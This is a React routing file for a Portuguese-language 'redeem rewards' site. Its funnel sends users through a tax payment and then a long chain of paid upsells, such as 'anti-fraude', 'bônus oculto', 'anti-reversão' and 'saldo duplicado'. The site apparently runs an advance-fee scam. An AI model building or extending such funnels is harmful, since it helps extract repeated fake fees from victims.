import { lazy, Suspense } from "react";
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import { useTikTokAttribution } from "@/hooks/useTikTokAttribution";
import Index from "./pages/Index";
import NotFound from "./pages/NotFound";

// Lazy-loaded routes
const RedeemRewards = lazy(() => import("./pages/RedeemRewards"));
const ABDashboard = lazy(() => import("./pages/ABDashboard"));
const UpsellDashboard = lazy(() => import("./pages/UpsellDashboard"));
const TenfABDashboard = lazy(() => import("./pages/TenfABDashboard"));
const FunnelAnalytics = lazy(() => import("./pages/FunnelAnalytics"));
const FunnelLayout = lazy(() => import("@/components/funnel/FunnelLayout"));

const FunnelIndex = lazy(() => import("./pages/funnel/FunnelIndex"));
const FunnelConfirmTaxPage = lazy(() => import("./pages/funnel/FunnelConfirmTaxPage"));
const FunnelTaxPaymentPage = lazy(() => import("./pages/funnel/FunnelTaxPaymentPage"));
const FunnelUpsellTENFPage = lazy(() => import("./pages/funnel/FunnelUpsellTENFPage"));
const FunnelTENFPaymentPage = lazy(() => import("./pages/funnel/FunnelTENFPaymentPage"));
const FunnelUpsellTransacionalPage = lazy(() => import("./pages/funnel/FunnelUpsellTransacionalPage"));
const FunnelTransacionalPaymentPage = lazy(() => import("./pages/funnel/FunnelTransacionalPaymentPage"));
const FunnelUpsellAntiFraudePage = lazy(() => import("./pages/funnel/FunnelUpsellAntiFraudePage"));
const FunnelAntiFraudePaymentPage = lazy(() => import("./pages/funnel/FunnelAntiFraudePaymentPage"));
const FunnelUpsellBonusOcultoPage = lazy(() => import("./pages/funnel/FunnelUpsellBonusOcultoPage"));
const FunnelBonusOcultoPaymentPage = lazy(() => import("./pages/funnel/FunnelBonusOcultoPaymentPage"));
const FunnelUpsellAntiReversaoPage = lazy(() => import("./pages/funnel/FunnelUpsellAntiReversaoPage"));
const FunnelAntiReversaoPaymentPage = lazy(() => import("./pages/funnel/FunnelAntiReversaoPaymentPage"));
const FunnelUpsellSaqueImediatoPage = lazy(() => import("./pages/funnel/FunnelUpsellSaqueImediatoPage"));
const FunnelSaqueImediatoPaymentPage = lazy(() => import("./pages/funnel/FunnelSaqueImediatoPaymentPage"));
const FunnelUpsellAntiErrosPage = lazy(() => import("./pages/funnel/FunnelUpsellAntiErrosPage"));
const FunnelAntiErrosPaymentPage = lazy(() => import("./pages/funnel/FunnelAntiErrosPaymentPage"));
const FunnelUpsellSaldoDuplicadoPage = lazy(() => import("./pages/funnel/FunnelUpsellSaldoDuplicadoPage"));
const FunnelSaldoDuplicadoPaymentPage = lazy(() => import("./pages/funnel/FunnelSaldoDuplicadoPaymentPage"));
const FunnelSuccessPage = lazy(() => import("./pages/funnel/FunnelSuccessPage"));

const queryClient = new QueryClient();

const App = () => {
  useTikTokAttribution();

  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Sonner />
        <BrowserRouter>
          <Suspense fallback={<div className="min-h-screen bg-background" />}>
            <Routes>
              <Route path="/" element={<Index />} />
              <Route path="/resgatar" element={<RedeemRewards />} />
              {/* <Route path="/ab-dashboard" element={<ABDashboard />} /> */}
              {/* <Route path="/upsell-dashboard" element={<UpsellDashboard />} /> */}
              {/* <Route path="/tenf-ab-dashboard" element={<TenfABDashboard />} /> */}
              {/* <Route path="/funnel-analytics" element={<FunnelAnalytics />} /> */}
              <Route path="/funil" element={<FunnelLayout />}>
                <Route index element={<FunnelIndex />} />
                <Route path="confirmar-identidade" element={<FunnelConfirmTaxPage />} />
                <Route path="confirmar-taxa" element={<FunnelConfirmTaxPage />} />
                <Route path="pagamento-taxa" element={<FunnelTaxPaymentPage />} />
                <Route path="upsell-tenf" element={<FunnelUpsellTENFPage />} />
                <Route path="pagamento-tenf" element={<FunnelTENFPaymentPage />} />
                <Route path="upsell-transacional" element={<FunnelUpsellTransacionalPage />} />
                <Route path="pagamento-transacional" element={<FunnelTransacionalPaymentPage />} />
                <Route path="upsell-antifraude" element={<FunnelUpsellAntiFraudePage />} />
                <Route path="pagamento-antifraude" element={<FunnelAntiFraudePaymentPage />} />
                <Route path="upsell-bonus-oculto" element={<FunnelUpsellBonusOcultoPage />} />
                <Route path="pagamento-bonus-oculto" element={<FunnelBonusOcultoPaymentPage />} />
                <Route path="upsell-anti-reversao" element={<FunnelUpsellAntiReversaoPage />} />
                <Route path="pagamento-anti-reversao" element={<FunnelAntiReversaoPaymentPage />} />
                <Route path="upsell-saque-imediato" element={<FunnelUpsellSaqueImediatoPage />} />
                <Route path="pagamento-saque-imediato" element={<FunnelSaqueImediatoPaymentPage />} />
                <Route path="upsell-anti-erros" element={<FunnelUpsellAntiErrosPage />} />
                <Route path="pagamento-anti-erros" element={<FunnelAntiErrosPaymentPage />} />
                <Route path="upsell-saldo-duplicado" element={<FunnelUpsellSaldoDuplicadoPage />} />
                <Route path="pagamento-saldo-duplicado" element={<FunnelSaldoDuplicadoPaymentPage />} />
                <Route path="sucesso" element={<FunnelSuccessPage />} />
              </Route>
              {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
              <Route path="*" element={<NotFound />} />
            </Routes>
          </Suspense>
        </BrowserRouter>
      </TooltipProvider>
    </QueryClientProvider>
  );
};

export default App;
